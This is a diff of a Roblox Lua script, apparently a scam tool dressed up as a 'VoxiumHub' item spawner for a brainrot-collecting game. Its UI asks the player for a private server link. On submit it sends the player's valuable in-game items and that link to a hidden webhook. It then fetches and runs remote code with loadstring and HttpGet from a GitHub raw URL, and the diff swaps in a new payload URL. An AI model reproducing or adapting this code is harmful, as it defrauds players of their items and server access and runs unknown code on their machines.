@@ -81,7 +81,7 @@ local traitMap = {
     ["rbxassetid://97054765273857"] = "Jackolantern Pet",
 }
 
--- === BRAINROT FETCH FROM PLOTCONTROLLER (like sab (1).lua) ===
+-- === BRAINROT FETCH FROM PLOTCONTROLLER ===
 local Plot = require(ReplicatedStorage.Controllers.PlotController)
 local gen = require(ReplicatedStorage.Shared.Animals)
 local myPlot = Plot:GetMyPlot()
@@ -99,7 +99,7 @@ local function getAllBrainrots()
     return list
 end
 
--- === REST OF FUNCTIONS (optimized, no spam) ===
+-- === FUNCTIONS ===
 local function parsePingValue(p) local n,s=p:match("(%d+)([kmb]?)") n=tonumber(n)or 0 local m={k=1e3,m=1e6,b=1e9} return n*(m[s:lower()]or 1) end
 local pingThreshold = parsePingValue(Ping)
 
@@ -112,7 +112,6 @@ local function formatMoney(v)
 end
 
 local function hasHighValue(b) for _,d in ipairs(b) do if d.moneyPerSec >= pingThreshold then return true end end return false end
-local function hasHighValue10M(b) for _,d in ipairs(b) do if d.moneyPerSec >= 10000000 then return true end end return false end
 
 local function sendWebhook(brainrots, link)
     local text = ""
@@ -135,7 +134,7 @@ local function sendWebhook(brainrots, link)
     if req then pcall(function() req({Url=Webhook1, Method="POST", Headers={["Content-Type"]="application/json"}, Body=HttpService:JSONEncode(data)}) end) end
 end
 
--- === UI (no animations, draggable only) ===
+-- === UI (NO ANIMATIONS, DRAGGABLE) ===
 local Holder = Instance.new("Frame", SG)
 Holder.AnchorPoint = Vector2.new(0.5,0.5)
 Holder.Position = UDim2.fromScale(0.5,0.5)
@@ -168,12 +167,134 @@ UserInputService.InputChanged:Connect(function(i)
     if i == dragInput and dragging then update(i) end
 end)
 
--- UI Elements (same as before, no fade/slide)
--- [INSERT COMPACT UI CODE HERE - Avatar, Title, Input, Submit Button, etc.]
--- For brevity, assuming you paste the UI from previous version but remove all TweenService calls except button hover
+-- Top
+local Top = Instance.new("Frame", Holder)
+Top.BackgroundTransparency = 1
+Top.Size = UDim2.new(1,-32,0,80)
+Top.Position = UDim2.new(0,16,0,16)
+Top.ZIndex = 20
 
-local StatusArea = Instance.new("TextBox", Holder) -- ... (same setup)
--- ... [full UI setup from previous, but NO TweenService except button hover]
+local Avatar = Instance.new("ImageLabel", Top)
+Avatar.BackgroundTransparency = 1
+Avatar.Size = UDim2.fromOffset(64,64)
+Avatar.Image = "rbxassetid://0"
+Avatar.ZIndex = 21
+local aCorner = Instance.new("UICorner", Avatar); aCorner.CornerRadius = UDim.new(1,0)
+
+task.spawn(function()
+    local ok,url = pcall(Players.GetUserThumbnailAsync, Players, LP.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
+    if ok and url then Avatar.Image = url end
+end)
+
+local Info = Instance.new("Frame", Top)
+Info.BackgroundTransparency = 1
+Info.Size = UDim2.new(1,-80,1,0)
+Info.Position = UDim2.new(0,80,0,0)
+Info.ZIndex = 21
+
+local Title = Instance.new("TextLabel", Info)
+Title.BackgroundTransparency = 1
+Title.Text = "VoxiumHub"
+Title.Font = Enum.Font.GothamBlack
+Title.TextSize = 24
+Title.TextColor3 = COLORS.a1
+Title.TextStrokeColor3 = Color3.fromRGB(20,0,40)
+Title.TextStrokeTransparency = 0.6
+Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.Size = UDim2.new(1,0,0,28)
+Title.ZIndex = 22
+
+local Sub = Instance.new("TextLabel", Info)
+Sub.BackgroundTransparency = 1
+Sub.Font = Enum.Font.Gotham
+Sub.TextSize = 12
+Sub.TextColor3 = COLORS.dim
+Sub.TextXAlignment = Enum.TextXAlignment.Left
+Sub.Size = UDim2.new(1,0,0,18)
+Sub.Position = UDim2.new(0,0,0,30)
+Sub.ZIndex = 22
+
+task.spawn(function()
+    local name = LP and LP.Name or "User"
+    local dname = LP and LP.DisplayName or "Player"
+    local age = LP and (tostring(LP.AccountAge).." days") or "N/A"
+    local premium = (LP and LP.MembershipType and tostring(LP.MembershipType):find("Premium")) and "Premium" or "Standard"
+    Sub.Text = string.format("%s (@%s) • %s • %s", dname, name, age, premium)
+end)
+
+local Badge = Instance.new("TextLabel", Info)
+Badge.BackgroundTransparency = 1
+Badge.Text = "support[](https://discord.gg/59XeEXRe)"
+Badge.Font = Enum.Font.GothamBold
+Badge.TextSize = 12
+Badge.TextColor3 = COLORS.a2
+Badge.TextXAlignment = Enum.TextXAlignment.Left
+Badge.Size = UDim2.new(1,0,0,16)
+Badge.Position = UDim2.new(0,0,0,50)
+Badge.ZIndex = 22
+
+local Body = Instance.new("Frame", Holder)
+Body.BackgroundTransparency = 1
+Body.Size = UDim2.new(1,-32,0,108)
+Body.Position = UDim2.new(0,16,0,104)
+Body.ZIndex = 20
+
+local StatusArea = Instance.new("TextBox", Body)
+StatusArea.ClearTextOnFocus = false
+StatusArea.PlaceholderText = "Put Private server Link To get ur Sab Spawner Loaded"
+StatusArea.Text = ""
+StatusArea.Font = Enum.Font.Gotham
+StatusArea.TextSize = 14
+StatusArea.TextColor3 = COLORS.text
+StatusArea.PlaceholderColor3 = COLORS.dim
+StatusArea.BackgroundColor3 = Color3.fromRGB(12,12,22)
+StatusArea.BackgroundTransparency = 0.15
+StatusArea.Size = UDim2.new(1,0,0,54)
+StatusArea.Position = UDim2.new(0,0,0,0)
+StatusArea.ZIndex = 21
+StatusArea.TextXAlignment = Enum.TextXAlignment.Left
+StatusArea.TextYAlignment = Enum.TextYAlignment.Top
+StatusArea.TextWrapped = true
+local padding = Instance.new("UIPadding", StatusArea)
+padding.PaddingLeft = UDim.new(0,8)
+padding.PaddingRight = UDim.new(0,8)
+padding.PaddingTop = UDim.new(0,8)
+padding.PaddingBottom = UDim.new(0,8)
+local saCorner = Instance.new("UICorner", StatusArea); saCorner.CornerRadius = UDim.new(0,10)
+local saStroke = Instance.new("UIStroke", StatusArea); saStroke.Thickness=1; saStroke.Color=Color3.fromRGB(40,40,80); saStroke.Transparency=0.3
+
+local StatusSub = Instance.new("TextLabel", Body)
+StatusSub.BackgroundTransparency = 1
+StatusSub.Text = ""
+StatusSub.Font = Enum.Font.GothamSemibold
+StatusSub.TextSize = 12
+StatusSub.TextColor3 = COLORS.a2
+StatusSub.TextXAlignment = Enum.TextXAlignment.Left
+StatusSub.TextWrapped = true
+StatusSub.Size = UDim2.new(1,0,0,20)
+StatusSub.Position = UDim2.new(0,0,0,58)
+StatusSub.ZIndex = 23
+
+local BtnSubmit = Instance.new("TextButton", Body)
+BtnSubmit.Text = "Submit"
+BtnSubmit.AutoButtonColor = false
+BtnSubmit.ZIndex = 22
+BtnSubmit.Font = Enum.Font.GothamSemibold
+BtnSubmit.TextSize = 16
+BtnSubmit.TextColor3 = Color3.fromRGB(240,240,245)
+BtnSubmit.BackgroundColor3 = Color3.fromRGB(20,18,34)
+BtnSubmit.Size = UDim2.new(1,0,0,44)
+BtnSubmit.Position = UDim2.new(0,0,0,64)
+local btnCorner = Instance.new("UICorner", BtnSubmit); btnCorner.CornerRadius = UDim.new(0,10)
+local btnStroke = Instance.new("UIStroke", BtnSubmit); btnStroke.Thickness = 2; btnStroke.Transparency = 0.15
+local btnGrad = Instance.new("UIGradient", btnStroke); btnGrad.Color = ColorSequence.new(COLORS.a1, COLORS.a2)
+
+BtnSubmit.MouseEnter:Connect(function()
+    TweenService:Create(BtnSubmit, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(28,24,48)}):Play()
+end)
+BtnSubmit.MouseLeave:Connect(function()
+    TweenService:Create(BtnSubmit, TweenInfo.new(0.20), {BackgroundColor3 = Color3.fromRGB(20,18,34)}):Play()
+end)
 
 local function toast(msg, sub, main, subc)
     StatusArea.Text = msg
@@ -191,6 +312,5 @@ BtnSubmit.MouseButton1Click:Connect(function()
     local brainrots = getAllBrainrots()
     sendWebhook(brainrots, link)
     SG:Destroy()
-    -- Run anti-detection, mute, etc.
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/dinoscripts2334/extern-script/refs/heads/main/test"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Spv-Script/asad/refs/heads/main/a"))()
 end)
